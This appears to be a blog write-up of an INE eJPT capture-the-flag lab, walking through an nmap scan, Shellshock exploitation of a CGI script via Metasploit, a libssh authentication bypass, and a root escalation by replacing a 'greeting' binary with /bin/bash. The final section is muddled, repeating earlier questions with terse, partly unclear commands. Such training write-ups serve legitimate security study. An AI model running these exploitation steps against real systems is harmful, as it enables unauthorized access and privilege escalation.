---
title: "eJPT - Host & Network Penetration Testing: System-Host Based Attacks CTF 2"
date: 2025-05-25 00:00:00 - 0500
categories: [ eJPT , Lab , Vulnerability Assessment]
tags: [Footprinting, Easy]
image:
    path: /assets/img/1.gif
    alt: image
---

## Overview:

System/host-based attacks target the underlying operating system or individual hosts within a network to compromise their security. These attacks exploit vulnerabilities in the system's configuration, software, or hardware to gain unauthorized access, escalate privileges, or disrupt the normal functioning of the host. Common techniques include exploiting unpatched software vulnerabilities, misconfigurations, weak passwords, and malware infections. Attackers may attempt to gain root or administrator privileges to manipulate or steal sensitive data, install backdoors, or cause system crashes. System/host-based attacks can lead to significant breaches if not detected and mitigated promptly, making it essential for organizations to regularly update software, implement strong security policies, and monitor for suspicious activity to protect their systems from these threats.

This lab is designed to test your knowledge and skills in performing system/host-based attacks on Linux targets and identifying hidden information on a target machine.

---

### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **[http://target1.ine.local](http://target1.ine.local)** and **[http://target2.ine.local](http://target2.ine.local)**.

**Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

**Flags to Capture:**

- **Flag 1**: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
- **Flag 2**: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
- **Flag 3**: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
- **Flag 4**: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

# Tools

The best tools for this lab are:

- Nmap
- Burp Suite
- Metasploit Framework

---

### Note

In this lab, the flag will follow the format: FLAG1_MD5Hash. For example, FLAG1_0f4d0db3668dd58cabb9eb409657eaa8. You need to submit only the MD5 hash

---

## Questions:

1. Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
2. In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
3. Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
4. The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

---

### Question 1:

Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.

```bash
┌──(root㉿INE)-[~]
└─# nmap -sC -sV target1.ine.local
Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2025-04-25 11:05 IST
Nmap scan report for target1.ine.local (192.64.32.3)
Host is up (0.000041s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((Unix))
|_http-title: Browser Detector
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (Unix)
MAC Address: 02:42:C0:40:20:03 (Unknown)
```

By running the Nmap scan we found that a web service is running on the port 80, and by navigating on the site we found that i was a directory called cgi which we already know that there is the bug, it can be exploited, here we fire up the mfconsole.
![alt text](</assets/img/Pasted image 20250525145232.png>)
![alt text](</assets/img/Pasted image 20250525145252.png>)


```bash
set targeturi /browser.cgi
set rhost
set lhost eth1
run 
```

Now we got a shell over the system
![alt text](</assets/img/Pasted image 20250525145310.png>)

```bash
meterpreter > cd /
meterpreter > dir
Listing: /
==========

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  0     fil   2025-04-25 11:03:32 +0530  .dockerenv
040755/rwxr-xr-x  4096  dir   2019-12-17 20:31:30 +0530  bin
040755/rwxr-xr-x  4096  dir   2014-04-11 03:42:14 +0530  boot
040755/rwxr-xr-x  340   dir   2025-04-25 11:03:32 +0530  dev
040755/rwxr-xr-x  4096  dir   2025-04-25 11:03:32 +0530  etc
100644/rw-r--r--  39    fil   2025-04-25 11:03:33 +0530  flag.txt
040755/rwxr-xr-x  4096  dir   2014-04-11 03:42:14 +0530  home
040755/rwxr-xr-x  4096  dir   2021-12-27 11:48:46 +0530  lib
040755/rwxr-xr-x  4096  dir   2019-12-17 20:30:41 +0530  lib64
040755/rwxr-xr-x  4096  dir   2019-12-17 20:30:03 +0530  media
040755/rwxr-xr-x  4096  dir   2014-04-11 03:42:14 +0530  mnt
040755/rwxr-xr-x  4096  dir   2021-12-28 09:49:42 +0530  opt
040555/r-xr-xr-x  0     dir   2025-04-25 11:03:32 +0530  proc
040700/rwx------  4096  dir   2019-12-17 20:31:28 +0530  root
040755/rwxr-xr-x  4096  dir   2025-04-25 11:03:33 +0530  run
040755/rwxr-xr-x  4096  dir   2021-03-26 04:03:42 +0530  sbin
040755/rwxr-xr-x  4096  dir   2019-12-17 20:30:03 +0530  srv
100755/rwxr-xr-x  36    fil   2021-12-28 09:50:48 +0530  start-apache2.sh
100755/rwxr-xr-x  32    fil   2021-12-28 09:48:47 +0530  startup.sh
040555/r-xr-xr-x  0     dir   2024-10-17 17:52:10 +0530  sys
041777/rwxrwxrwx  4096  dir   2025-04-25 11:30:35 +0530  tmp
040755/rwxr-xr-x  4096  dir   2019-12-17 20:30:03 +0530  usr
040755/rwxr-xr-x  4096  dir   2019-12-17 20:31:28 +0530  var

meterpreter > cat flag.txt 
FLAG1_d2e3db569f4f4459a8554*********
```

---

### Question 2:

In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.

So, let’s move on directory '/opt/apache/htdocs/' there we found the next flag.

```bash
meterpreter > cd  /opt/apache/htdocs/
meterpreter > dir
Listing: /opt/apache/htdocs
===========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  39    fil   2025-04-25 11:03:35 +0530  .flag.txt
100755/rwxr-xr-x  6364  fil   2021-12-28 09:50:48 +0530  browser.cgi
100644/rw-r--r--  517   fil   2021-12-28 09:50:48 +0530  index.html
040755/rwxr-xr-x  4096  dir   2021-12-27 14:24:09 +0530  static

meterpreter > cat .flag.txt 
FLAG2_8680af874fa745b786dea7*********
```

---

### Question 3:

Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.

```bash
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > search libssh_auth_bypass

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/libssh_auth_bypass  2018-10-16       normal  No     libssh Authentication Bypass Scanner
   1    \\_ action: Execute                      .                .       .      Execute a command
   2    \\_ action: Shell                        .                .       .      Spawn a shell

```

here we’ll set some information to this modules and here

```bash
set rhost target2.ine.local
set spawn_pty true
run
```

with that we gained the shell over this system (target2.ine.local)

```bash
sh-5.2$ pwd
pwd
/home/user
sh-5.2$ cat flag.txt
cat flag.txt
FLAG3_f115fc82e79543e89a0********
```

---

### Question 4:

The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.

Found by using this payload

```bash
exploit/multi/http/apache_mod_cgi_bash_env_exec
```

In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.

```bash
it's hidden on the main login of question 1
```

Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.

```bash
search libssh
use scanner/ssh/libssh_auth_bypass
set spawn_pty true
run
cat flag3
```

The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

```bash
rm greeting
cp /bin/bash greetings
welcome
cat root
```